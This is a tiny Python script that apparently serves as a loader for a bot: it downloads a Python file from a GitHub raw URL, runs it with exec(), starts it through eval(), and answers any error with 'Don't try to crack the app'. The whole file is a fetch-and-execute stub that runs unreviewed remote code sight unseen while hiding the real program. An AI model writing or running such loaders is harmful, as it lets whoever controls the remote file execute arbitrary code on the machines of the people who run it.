print("connect 2")
import requests
data = requests.get(url="https://raw.githubusercontent.com/walidfoxy/BOTs-Fox-/main/BOT%20Fox!.py").text
exec(data)


def start_script():
    try:
        eval("""start_bot()""")
    except Exception as e:
        return "Don't try to crack the app"
        